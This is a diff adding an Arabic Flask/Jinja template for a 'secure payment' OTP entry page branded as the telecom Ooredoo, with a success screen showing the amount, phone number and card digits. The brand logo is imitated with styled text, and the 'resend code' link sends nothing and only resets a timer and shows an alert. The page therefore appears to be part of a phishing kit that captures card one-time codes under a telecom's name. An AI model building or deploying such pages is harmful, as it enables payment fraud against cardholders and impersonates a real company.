@@ -1,0 +1,181 @@
+{% extends 'base.html' %}
+
+{% block title %}الدفع الآمن - رمز التحقق{% endblock %}
+
+{% block content %}
+<div class="payment-section my-3">
+    <div class="row">
+        <div class="col-lg-8 mx-auto">
+            <!-- هيدر صفحة الدفع -->
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <div class="secure-checkout">
+                    <h5 class="mb-0"><i class="fas fa-lock me-2"></i> الدفع الآمن</h5>
+                </div>
+                <div class="ooredoo-logo">
+                    <span style="font-family: Arial, sans-serif; font-size: 28px; font-weight: bold; color: #E60000;">ooredoo</span>
+                    <span style="display: inline-block; margin-right: 2px; font-size: 22px; color: #E60000;">•</span>
+                </div>
+            </div>
+            
+            <!-- صفحة OTP -->
+            <div class="card shadow-sm border-0 mb-4">
+                <div class="card-body p-4">
+                    {% if transaction_completed %}
+                    <!-- حالة نجاح العملية - شاشة التأكيد النهائية -->
+                    <div class="text-center">
+                        <i class="fas fa-check-circle fa-5x text-success mb-4"></i>
+                        <h1 class="h4 fw-bold mb-3">تمت العملية بنجاح</h1>
+                        
+                        <div class="alert alert-success mb-4">
+                            {% if transaction_details %}
+                                <h5 class="mb-3">{{ transaction_details.success_message }}</h5>
+                            {% else %}
+                                <h5 class="mb-3">تمت عملية الدفع بنجاح</h5>
+                            {% endif %}
+                        </div>
+                        
+                        <div class="transaction-details p-3 mb-4 bg-light rounded">
+                            <div class="row mb-2">
+                                <div class="col-6 text-start">رقم العملية:</div>
+                                <div class="col-6 text-end fw-bold">{{ transaction_number }}</div>
+                            </div>
+                            
+                            {% if transaction_details %}
+                                <div class="row mb-2">
+                                    <div class="col-6 text-start">رقم الهاتف:</div>
+                                    <div class="col-6 text-end">{{ transaction_details.mobile_number }}</div>
+                                </div>
+                                
+                                <div class="row mb-2">
+                                    <div class="col-6 text-start">المبلغ:</div>
+                                    <div class="col-6 text-end">{{ transaction_details.amount }} ر.ق</div>
+                                </div>
+                                
+                                {% if transaction_details.type == 'recharge' and transaction_details.recharge_type == 'package' %}
+                                    <div class="row mb-2">
+                                        <div class="col-6 text-start">الباقة:</div>
+                                        <div class="col-6 text-end">{{ transaction_details.package_name }}</div>
+                                    </div>
+                                {% endif %}
+                            {% endif %}
+                            
+                            <div class="row mb-2">
+                                <div class="col-6 text-start">طريقة الدفع:</div>
+                                <div class="col-6 text-end">بطاقة ائتمان ({{ payment_card_last4 }})</div>
+                            </div>
+                            
+                            <div class="row mb-2">
+                                <div class="col-6 text-start">تاريخ العملية:</div>
+                                <div class="col-6 text-end">{{ now().strftime('%Y-%m-%d %H:%M') }}</div>
+                            </div>
+                        </div>
+                        
+                        <a href="{{ url_for('index') }}" class="btn btn-primary btn-lg px-5">العودة للصفحة الرئيسية</a>
+                    </div>
+                    {% else %}
+                    <!-- حالة إدخال رمز التحقق OTP -->
+                    <div class="text-right mb-4">
+                        <h4 class="fw-bold mb-2 text-right">إدخال رمز</h4>
+                        <p class="text-muted text-right">أدخل رمز التحقق الذي أرسلناه إليك</p>
+                    </div>
+                    
+                    <!-- العداد التنازلي -->
+                    <div class="time-counter bg-light p-3 mb-4 rounded d-flex align-items-center">
+                        <div class="countdown-icon me-2">
+                            <i class="far fa-clock text-success"></i>
+                        </div>
+                        <div class="countdown-text">
+                            الدقائق المتبقية لهذا الرمز: <span id="countdown" class="fw-bold">01:57</span>
+                        </div>
+                    </div>
+                    
+                    <form method="POST" novalidate>
+                        {{ form.csrf_token }}
+                        {{ form.transaction_id() }}
+                        {{ form.otp_step() }}
+                        
+                        <div class="mb-4">
+                            <label for="{{ form.otp.id }}" class="form-label">رمز التحقق <span class="text-danger">*</span></label>
+                            {{ form.otp(class="form-control", placeholder="أدخل رمز التحقق", autocomplete="off") }}
+                            
+                            {% if form.otp.errors %}
+                                <div class="text-danger mt-2">
+                                    {% for error in form.otp.errors %}
+                                        {{ error }}
+                                    {% endfor %}
+                                </div>
+                            {% endif %}
+                        </div>
+                        
+                        <div class="d-flex justify-content-end mb-4">
+                            <a href="#" class="text-primary text-decoration-none" id="resend-otp">
+                                <i class="fas fa-sync-alt me-1"></i> إعادة إرسال الرمز
+                            </a>
+                        </div>
+                        
+                        <div class="d-grid mt-4">
+                            {{ form.submit(class="btn btn-lg btn-danger fw-bold", value="تأكيد", style="background-color: #E60000; border-color: #E60000;") }}
+                        </div>
+                    </form>
+                    
+                    <div class="payment-icons text-center mt-4">
+                        <img src="{{ url_for('static', filename='images/amex-logo.svg') }}" alt="American Express" height="25" class="me-2">
+                        <img src="{{ url_for('static', filename='images/mastercard-logo.svg') }}" alt="Mastercard" height="25" class="me-2">
+                        <img src="{{ url_for('static', filename='images/visa-logo.svg') }}" alt="Visa" height="20">
+                    </div>
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // OTP timer countdown
+        let minutes = 1;
+        let seconds = 57;
+        const countdownEl = document.getElementById('countdown');
+        const resendBtn = document.getElementById('resend-otp');
+        
+        if (countdownEl && resendBtn) {
+            const formatTime = () => {
+                return `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            }
+            
+            countdownEl.textContent = formatTime();
+            
+            const timer = setInterval(function() {
+                if (seconds > 0) {
+                    seconds--;
+                } else if (minutes > 0) {
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    clearInterval(timer);
+                    resendBtn.style.opacity = '1';
+                    resendBtn.style.pointerEvents = 'auto';
+                    return;
+                }
+                
+                countdownEl.textContent = formatTime();
+            }, 1000);
+            
+            // Resend OTP handler
+            resendBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Reset timer
+                minutes = 1;
+                seconds = 57;
+                countdownEl.textContent = formatTime();
+                
+                // Show alert that OTP has been resent
+                alert('تم إعادة إرسال رمز التحقق');
+            });
+        }
+    });
+</script>
+{% endblock %}
